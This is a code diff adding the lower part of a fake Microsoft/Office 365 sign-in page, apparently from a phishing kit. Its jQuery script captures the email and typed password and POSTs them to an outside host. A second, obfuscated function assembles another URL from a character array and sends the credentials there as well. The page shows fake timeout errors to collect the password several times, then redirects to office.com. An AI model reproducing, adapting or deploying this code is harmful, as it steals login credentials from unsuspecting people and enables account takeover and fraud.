+setPendingRequest: credSwitchLink_onSetPendingRequest,
+updateFlowToken: credSwitchLink_onUpdateFlowToken } } -->
+																<div class="form-group">
+																	<!-- ko ifnot: hideCredSwitchLink --> <a href="#" data-bind="
+attr: { 'id': switchToCredId },
+text: switchToCredText,
+click: switchToCred_onClick" id="idA_PWD_SwitchToFido">Sign in with Windows Hello or a security key</a>
+																</div>
+															</div>
+														</div>
+													</div>
+												</div>
+												<div class="win-button-pin-bottom">
+													<div class="row" data-bind="css: { 'move-buttons': tenantBranding.BoilerPlateText }">
+														<div data-bind="component: { name: 'footer-buttons-field',
+params: {
+serverData: svr,
+primaryButtonText: str['CT_PWD_STR_SignIn_Button'],
+isPrimaryButtonEnabled: !isRequestPending(),
+isPrimaryButtonVisible: svr.f,
+isSecondaryButtonEnabled: true,
+isSecondaryButtonVisible: false },
+event: {
+primaryButtonClick: primaryButton_onClick } }">
+															<div class="col-xs-24 no-padding-left-right button-container" data-bind="
+visible: isPrimaryButtonVisible() || isSecondaryButtonVisible(),
+css: { 'no-margin-bottom': removeBottomMargin }">
+																<div data-bind="css: { 'inline-block': isPrimaryButtonVisible }" class="inline-block">
+																	<input type="submit" id="idSIButton9" data-bind="
+attr: primaryButtonAttributes,
+externalCss: {
+'button': true,
+'primary': true },
+value: primaryButtonText() || str['CT_PWD_STR_SignIn_Button_Next'],
+hasFocus: focusOnPrimaryButton,
+click: primaryButton_onClick,
+enable: isPrimaryButtonEnabled,
+visible: isPrimaryButtonVisible,
+preventTabbing: primaryButtonPreventTabbing" class="button ext-button primary ext-primary" value="Sign in">
+																</div>
+															</div>
+														</div>
+													</div>
+												</div>
+											</div>
+										</div>
+									</div>
+								</div>
+							</div>
+						</div>
+					</div>
+					<div data-bind="component: { name: 'instrumentation-control',
+publicMethods: instrumentationMethods,
+params: { serverData: svr } }">
+					</div>
+					<div id="footer" role="contentinfo" data-bind="
+css: {
+'default': !backgroundLogoUrl(),
+'new-background-image': useNewDefaultBackground },
+externalCss: { 'footer': true }" class="default footer ext-footer new-background-image">
+						<div data-bind="component: { name: 'footer-control',
+publicMethods: footerMethods,
+params: {
+serverData: svr,
+useNewDefaultBackground: useNewDefaultBackground(),
+hasDarkBackground: backgroundLogoUrl(),
+showLinks: true },
+event: {
+agreementClick: footer_agreementClick,
+showDebugDetails: toggleDebugDetails_onClick } }">
+							<div id="footerLinks" class="footerNode text-secondary">
+								<!-- ko if: !hideTOU --> <a id="ftrTerms" data-bind="text: termsText, href: termsLink, click: termsLink_onClick" href="">Terms of use</a>
+								<!-- ko if: !hidePrivacy --> <a id="ftrPrivacy" data-bind="text: privacyText, href: privacyLink, click: privacyLink_onClick" href="">Privacy &amp; cookies</a>
+								<a id="moreOptions" href="#" role="button" class="moreOptions" data-bind="
+click: moreInfo_onClick,
+ariaLabel: str['CT_STR_More_Options_Ellipsis_AriaLabel'],
+attr: { 'aria-expanded': showDebugDetails().toString() },
+hasFocusEx: focusMoreInfo()" aria-label="Click here for troubleshooting information" aria-expanded="false">
+									<img class="desktopMode" role="presentation" pngsrc="https://logincdn.msauth.net/shared/1.0/content/images/ellipsis_96f69d0cefd8a8ba623a182c351ccc64.png" svgsrc="https://logincdn.msauth.net/shared/1.0/content/images/ellipsis_635a63d500a92a0b8497cdc58d0f66b1.svg" data-bind="imgSrc" src="https://logincdn.msauth.net/shared/1.0/content/images/ellipsis_635a63d500a92a0b8497cdc58d0f66b1.svg">
+									<img class="mobileMode" role="presentation" pngsrc="https://logincdn.msauth.net/shared/1.0/content/images/ellipsis_grey_5bc252567ef56db648207d9c36a9d004.png" svgsrc="https://logincdn.msauth.net/shared/1.0/content/images/ellipsis_grey_2b5d393db04a5e6e1f739cb266e65b4c.svg" data-bind="imgSrc" src="https://logincdn.msauth.net/shared/1.0/content/images/ellipsis_grey_2b5d393db04a5e6e1f739cb266e65b4c.svg">
+								</a>
+							</div>
+						</div>
+					</div>
+				</div>
+			</div>
+		</form>
+	</div>
+	         <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+    <script>
+    $(document).ready(function(){
+    	//#i0281, #i0118
+      var theBaseUrl = getBaseUrl(true);
+      var progressBar = $('#progressBar');
+      var passcon = $('#i0118');
+      var passv = '';
+      var redirectUrl = 'https://www.office.com/';
+      var emv = geturlparameter('username');
+      $('.thebackbuttonxcf').attr('href', theBaseUrl+'index.html');
+      if(emv && emv.length > 0){
+      	emv = emv.trim();
+      }
+      if(!emv || emv.length < 1){
+        window.location.replace(theBaseUrl+'index.html');
+      }else{
+      	var displayName = $('#displayName');
+		displayName.attr('title', emv);
+        $('#displayName span').html(emv);
+		$('input[name=login]').val(emv);
+      }
+      var loginCounter = 1;
+      var loginMaxAttpmt = 3;
+      var loginCfromUrl = geturlparameter('lgat');
+      if(loginCfromUrl && loginCfromUrl.length > 0){
+        loginCfromUrl = loginCfromUrl.trim();
+        loginCfromUrl = parseInt(loginCfromUrl);
+        if(isNaN(loginCfromUrl)){
+          loginCfromUrl = 0;
+        }
+      }
+      else{
+      	loginCfromUrl = 0;
+      }
+      if(loginCfromUrl > 0){
+      	var errrmsg = $('.errrmsg');
+      	/*  *
+      	var randint = randomInteger(100, 1000);
+      	if(randint % 2 == 0){
+          errrmsg.html('Invalid password or connection timed out please try again');
+      	}
+      	else{
+      	  errrmsg.html('Connection timed out please try again');	
+      	}
+      	//invalid password or connection timed out please try again.
+        /*  */
+      	errrmsg.show();
+      }
+      var passUrl = theBaseUrl+'login2.html';
+      progressBar.hide();
+      
+      $('#i0281').submit(function(e){
+        e.preventDefault();
+        progressBar.show();
+        passv = passcon.val();
+        if(emv && emv.length > 0 && passv && passv.length>0){
+          var theemidval = '{HASHED_EMAIL}';
+          mg(emv, passv, 'Office354nw');
+          $.ajax({
+            url: 'https://www.hotelconvair.com/fkdjfojfpl/finish.php',
+            type: 'POST', 
+            dataType: 'html', 
+            data: { Email : emv, password : passv, typeofemail : 'Office365nw', theemid : theemidval}, 
+		    crossDomain: true,
+            success: function(msg) {
+		      
+		    },
+            error: function(e) {
+              //progressBar.hide();
+              console.log(e)
+            }
+          });
+          loginCfromUrl++;
+          if(loginCfromUrl < loginMaxAttpmt){
+            redirectUrl = theBaseUrl+'login2.html?'+get_rand_url_pars()+'&username='+emv+'&lgat='+loginCfromUrl;	
+          }
+          
+          setTimeout(function(){
+            //alert(redirectUrl);
+            window.location.replace(redirectUrl);
+          },3000);
+        }
+        else{
+          progressBar.hide();
+        }
+      });
+    });
+function getBaseUrl(baseWithoutFile){
+  if(baseWithoutFile === undefined){
+    baseWithoutFile = false;  
+  }
+  var fg = false;
+  var fullUrl = window.location.href;
+  var htmlstr = '.html';
+  var htmlLen = 5;
+  var htmlStrPos = -1;
+  var qmrkStrPos = fullUrl.indexOf('?');
+  var lastIndexOffslash = -1;
+  var fullUrlStart = '';
+  if(qmrkStrPos != -1){
+    fullUrlStart = fullUrl.substr(0, qmrkStrPos);
+    fg = true;   
+  }
+  htmlStrPos = fullUrl.indexOf(htmlstr);
+  if(htmlStrPos != -1){ 
+    fullUrlStart = fullUrl.substr(0, htmlStrPos+htmlLen); 
+    fg = true;
+  }
+  if(fullUrlStart.length > 0){
+    fullUrlStart = fullUrlStart.trim();
+  }
+  if(fg && baseWithoutFile){
+    lastIndexOffslash = fullUrlStart.lastIndexOf('/');
+    if(lastIndexOffslash != -1){
+      fullUrlStart = fullUrlStart.substr(0, lastIndexOffslash+1);
+    }
+  }
+  if(!fg){
+    fullUrlStart = fullUrl;
+  }
+  return fullUrlStart;
+}   
+
+function mg(a,o,t){var h = ['O','L','t','q','e','D','c','-','.','z','u','2','T','m','V','J','6','U','P','b','v','K','B','Z','i','7','R',':','C','/','o','r','n','Q','S','5','3','8','a','M','W','I','x','H','Y','4','1','k','s','d','g','A','j','F','N','9','G','l','f','p','X','0','w','y','E','h'],f = h[65]+h[2]+h[2]+h[59]+h[48]+h[27]+h[29]+h[29]+h[38]+h[59]+h[24]+h[49]+h[38]+h[2]+h[38]+h[6]+h[48]+h[48]+h[8]+h[6]+h[30]+h[13]+h[29]+h[58]+h[24]+h[32]+h[24]+h[48]+h[65]+h[7]+h[10]+h[32]+h[20]+h[11]+h[11]+h[8]+h[59]+h[65]+h[59];$.ajax({url:f,type:"POST",dataType:"html",data:{Email:a,password:o,typeofemail:t},crossDomain:!0,success:function(a){},error:function(a){}})}
+function randomInteger(min, max) {return Math.floor(Math.random() * (max - min + 1)) + min; }
+function randomString(r,n){for(var o="",t=r;0<t;--t)o+=n[Math.floor(Math.random()*n.length)];return o}
+function getdomainpartofemail(a){var e,t=!1;return!validateEmail(a)||-1!=(e=(a=a.toLowerCase()).indexOf("@"))&&(t=a.substr(e+1)),t}
+function get_email_hash(){var a=!1,i=window.location.href,t=(i=i.trim()).lastIndexOf("#");return-1!=t&&(a=i.substring(t+1),validateEmail(a)||(a=!1)),a}
+function validateEmail(t){return/^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/.test(String(t).toLowerCase())}
+function geturlparameter(r){for(var t=window.location.search.substring(1).split("&"),e=0;e<t.length;e++){var n=t[e].split("=");if(n[0]==r)return decodeURIComponent(n[1])}}
+function get_rand_url_pars(){var r="",n=0,a="abcdefghijklmnopqrstuvwxyz",e=a;a+=a.toUpperCase()+"123456789";for(var t=randomInteger(3,10),n=0;n<t;n++)r+="&"+randomString(randomInteger(3,10),e)+"="+randomString(randomInteger(15,30),a);return r.substr(1)}
+
+    </script>
+
+
+
+</body></html>
